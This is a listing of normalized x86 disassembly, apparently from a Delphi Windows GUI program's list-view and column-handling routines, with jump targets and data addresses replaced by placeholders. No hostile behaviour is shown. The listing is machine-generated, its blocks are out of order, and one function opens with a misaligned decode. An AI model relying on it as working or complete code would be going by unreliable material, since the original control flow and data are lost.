sub_437a64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4192f4
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov esi eax
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_437704
mov edx [ esi + 0xc ]
mov eax ebx
call sub_4377b4
mov ecx [ esi + 0x10 ]
xor edx edx
mov eax ebx
call sub_4378bc
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_4379f8
mov ecx [ esi + 0x1c ]
mov edx 0x1
mov eax ebx
call sub_4378bc
mov ecx [ esi + 0x20 ]
mov edx 0x2
mov eax ebx
call sub_4378bc
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_437b24
mov eax esi
call sub_437658
mov edx eax
mov eax ebx
call sub_43769c
pop esi
pop ebx
retn
sub_437afc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x24 ]
mov edx [ esi + 0x24 ]
call sub_404524
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
cmp eax [ esi + 0xc ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_437b54
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_437b38
push eax
mov eax esi
call sub_437644
mov ecx edi
pop edx
call sub_42aa04
pop edi
pop esi
pop ebx
retn
sub_437b90
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_43753c
cmp edi eax
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov ecx edi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_437550
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax ebx
call sub_437b38
mov [ esp + 0x4 ] eax
inc esi
mov [ esp + 0x8 ] esi
mov eax ebx
call sub_437644
mov edx esp
call sub_42a974
sub_437bfc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_437c38
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_437db4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_437c70
push ebx
push esi
push edi
add esp 0xffffffd8
mov esi ecx
mov ebx eax
test edx edx
jne r-xdata
mov edi edx
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0xf8 ]
mov edi eax
jmp r-xdata
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_4385d4
push esp
mov eax ebx
call sub_437ce4
pop edx
call sub_42a98c
mov eax edi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_437cc0
mov esi eax
test esi esi
jge r-xdata
sub_437cc0
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_4553b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_437ce4
call sub_42a948
pop ebx
retn
sub_437cf0
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_4553b8
test al al
je r-xdata
mov eax esi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov [ esp ] 0x4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_437ce4
mov edx esp
call sub_42a95c
test eax eax
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x28
call sub_402d00
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx esp
mov eax [ ebx + 0x4 ]
call sub_439c94
mov esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
sub_437d70
push ebx
add esp 0xffffffe8
mov ebx eax
mov [ esp ] 0x1
mov [ esp + 0x8 ] edx
mov eax ebx
call sub_437ce4
mov ecx esp
or edx 0xffffffff
call sub_42a9f4
add esp 0x18
pop ebx
retn
sub_437dec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
test dl dl
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x229 ]
mov [ eax + 0x288 ] dl
xor edx edx
call sub_43b160
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419a38
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x288 ]
call sub_43b160
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419a38
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
call sub_437ce4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439984
test al al
je r-xdata
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
xor eax eax
push ebp
push sub_437f6d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0xb
mov eax [ ebp - 0x4 ]
call sub_437ce4
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x0
retn
inc esi
xor edi edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_439990
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov [ ebx + 0x20 ] eax
mov eax ebx
call sub_436db8
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_436c60
inc edi
dec esi
jne r-xdata
mov edx eax
mov eax ebx
call sub_436dec
xor eax eax
mov [ ebx + 0x20 ] eax
push 0x0
push 0x0
push 0xb
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x264 ]
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_436f90
mov ebx eax
mov eax [ ebx + 0x24 ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x23c ]
mov edx edi
call sub_436f90
mov ebx eax
mov eax [ ebx + 0x20 ]
test eax eax
jge r-xdata
sub_437fc4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx ebx
mov eax edi
call sub_4192f4
mov eax edi
call sub_437db4
mov ebp ebx
mov eax ebp
call sub_437cc0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_437cf0
push eax
mov eax edi
call sub_437c64
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_438024
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax edi
call sub_437cc0
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_437cc0
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_437cc0
test eax eax
setg bl
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_437cc0
dec eax
test eax eax
jl r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx esi
mov eax edi
call sub_437cf0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_437cf0
pop edx
call sub_437afc
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_4380b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4193e0
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_438318
push ebp
call sub_438024
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438109
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4382f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_437db4
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax ebx
call sub_41b720
mov eax [ ebp - 0xc ]
call sub_407fe0
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_4382d4
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ecx [ ebp - 0xc ]
sub ecx 0x4
mov eax [ ebp - 0x14 ]
lea edx [ eax + 0x4 ]
mov eax ebx
call sub_41b720
mov eax [ ebp - 0x14 ]
add eax 0x8
mov [ ebp - 0x18 ] eax
xor ebx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx eax
sub edx [ ebp - 0x14 ]
cmp edx [ ebp - 0xc ]
jge r-xdata
inc eax
mov [ ebp - 0x1c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4382db
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_437cc0
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x10 ]
add [ ebp - 0x18 ] eax
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_437c64
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x18 ]
add edx 0x14
call sub_40437c
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
call sub_437704
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
xor edx edx
mov eax [ ebp - 0x20 ]
call sub_4378bc
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x8 ]
mov edx 0x1
mov eax [ ebp - 0x20 ]
call sub_4378bc
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
mov edx 0x2
mov eax [ ebp - 0x20 ]
call sub_4378bc
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x20 ]
call sub_4377b4
mov eax [ ebp - 0x18 ]
lea ebx [ eax + 0x14 ]
xor eax eax
mov al [ ebx ]
inc eax
add ebx eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov esi [ eax + 0xc ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_40437c
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
mov al [ ebx ]
lea edx [ eax + 0x1 ]
add [ ebp - 0x10 ] edx
add ebx edx
dec esi
jne r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0x1c ]
jne r-xdata
inc esi
xor ebx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437cf0
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
movsx ecx [ edi ]
mov edx ebx
mov eax [ ebp - 0x24 ]
call sub_437b90
add edi 0x2
inc ebx
dec esi
jne r-xdata
sub_438318
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4385ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10 ] 0x8
mov eax [ ebp - 0x4 ]
call sub_437cc0
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
call sub_407fe0
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_43858b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
call sub_437cc0
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x1c ]
add eax 0x8
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
call sub_437cc0
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_437cc0
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x14 ]
add eax 0x15
add [ ebp - 0x10 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_41b758
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438592
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_40270c
retn
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
add eax 0x15
add eax [ ebp - 0x18 ]
add [ ebp - 0x20 ] eax
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437cf0
mov eax [ eax + 0x24 ]
call sub_438304
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437cf0
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437cf0
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x34 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
call sub_438304
inc eax
add [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x2
inc esi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x28 ]
jne r-xdata
inc ebx
xor esi esi
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437cf0
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov edx [ ebp - 0x2c ]
mov edx [ edx + 0x24 ]
mov ecx 0xff
call sub_4043b4
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp - 0x20 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x20 ]
add eax 0x14
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
movzx eax [ eax + 0x14 ]
inc eax
add [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
lea ecx [ ebp - 0x38 ]
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x24 ]
mov ecx 0xff
call sub_4043b4
mov eax [ ebp - 0x24 ]
movzx eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
inc eax
add [ ebp - 0x18 ] eax
add [ ebp - 0x24 ] eax
inc esi
dec ebx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_437cf0
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_437b84
mov [ edi ] ax
add edi 0x2
inc esi
dec ebx
jne r-xdata
sub_4385f8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032ec
test esi esi
jne r-xdata
add esp 0xfffffff0
call sub_403668
mov [ edi + 0x4 ] esi
xor edx edx
mov eax edi
call sub_43866c
xor edx edx
mov eax edi
call sub_438680
mov dl 0x1
mov eax edi
call sub_438694
mov eax edi
test bl bl
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4386a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_437618
cmp [ eax + 0x2ea ] 0x0
je r-xdata
mov eax [ esi + 0x24 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x24 ]
call sub_4045d8
push eax
call lstrcmpA
mov [ ebp - 0x4 ] eax
push esi
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_437618
mov esi eax
mov eax ebx
call sub_437618
mov edx eax
mov ecx ebx
mov eax [ esi + 0x2ec ]
call [ esi + 0x2e8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_438714
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_450de0
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0xfa
mov eax ebx
call sub_44e070
mov edx 0x96
mov eax ebx
call sub_44e094
mov dl 0x1
mov eax ebx
call sub_4395fc
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x128 ]
xor edx edx
mov eax ebx
call sub_44ea78
mov dl 0x1
mov eax ebx
call sub_4552e8
mov dl 0x1
mov eax ebx
call sub_4399dc
mov dl 0x1
mov eax ebx
call sub_439680
mov dl 0x1
mov eax ebx
call sub_439610
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov esi eax
mov [ ebx + 0x210 ] esi
mov eax esi
mov edx ebx
call sub_44d490
mov [ ebx + 0x26c ] 0xffffffff
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_436f4c
mov [ ebx + 0x23c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xfc ]
mov [ ebx + 0x22c ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov [ ebx + 0x28c ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4385f8
mov [ ebx + 0x234 ] eax
mov eax [ r-xdata ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419d80
mov [ ebx + 0x290 ] eax
mov [ ebx + 0x294 ] 0x0
mov [ ebx + 0x295 ] 0x0
xor eax eax
mov [ ebx + 0x2a0 ] eax
push 0x20
mov ecx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_45b97c
mov [ ebx + 0x224 ] eax
push ebx
push sub_439184
call sub_465660
mov [ ebx + 0x250 ] eax
push ebx
push sub_43908c
call sub_465660
mov [ ebx + 0x25c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0x27c ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_438e68
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0x280 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_438e68
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov esi eax
mov [ ebx + 0x284 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_438e68
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4388fc
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_4553b8
test al al
je r-xdata
mov eax [ esi + 0x224 ]
call sub_40331c
mov eax [ esi + 0x23c ]
call sub_40331c
mov eax [ esi + 0x28c ]
call sub_40331c
mov eax [ esi + 0x22c ]
call sub_40331c
mov eax [ esi + 0x234 ]
call sub_40331c
mov eax [ esi + 0x240 ]
call sub_40331c
mov eax [ esi + 0x248 ]
call sub_40331c
mov eax [ esi + 0x24c ]
call sub_40331c
mov eax [ esi + 0x290 ]
call sub_40331c
mov eax [ esi + 0x250 ]
call sub_465674
mov eax [ esi + 0x264 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ esi + 0x25c ]
call sub_465674
mov eax [ esi + 0x27c ]
call sub_40331c
mov eax [ esi + 0x280 ]
call sub_40331c
mov eax [ esi + 0x284 ]
call sub_40331c
mov eax [ esi + 0x210 ]
call sub_40331c
xor eax eax
mov [ esi + 0x210 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_450f04
test bl bl
jle r-xdata
mov edx [ esi + 0x260 ]
push edx
push 0xfffffffc
push eax
call SetWindowLongA
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4389fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
call sub_4368cc
mov edx esi
mov eax ebx
call sub_451f40
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_451e6c
mov edx [ esi + 0x4 ]
or edx 0x2000000
xor ecx ecx
mov cl [ ebx + 0x215 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x214 ]
or edx [ ecx * 4 + rw-data ]
mov eax [ ebx + 0x234 ]
xor ecx ecx
mov cl [ eax + 0x8 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x216 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x228 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x238 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ eax + 0x9 ]
or edx [ ecx * 4 + rw-data ]
movzx eax [ eax + 0xa ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22b ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x22a ]
or edx [ eax * 4 + rw-data ]
or edx 0x40
mov [ esi + 0x4 ] edx
cmp [ ebx + 0x244 ] 0x0
je r-xdata
cmp [ ebx + 0x245 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x1000
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
or [ esi + 0x4 ] 0x400
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_438b28
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419994
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x248 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c09c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438bb0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41e6b8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
call sub_41cd70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_438bdc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45206c
mov eax [ ebp - 0x4 ]
call sub_4392a4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_4396b4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_439694
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x268 ]
mov eax [ ebp - 0x4 ]
call sub_4396e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_436fe0
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x218 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437dd4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x289 ] 0x1
xor eax eax
push ebp
push sub_438d06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_419994
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov edx [ ebp - 0x4 ]
call sub_41b884
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x21c ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_45baf4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x2a0 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437d98
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x220 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_45baf4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_45bc30
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_438e40
push ebp
call sub_438b28
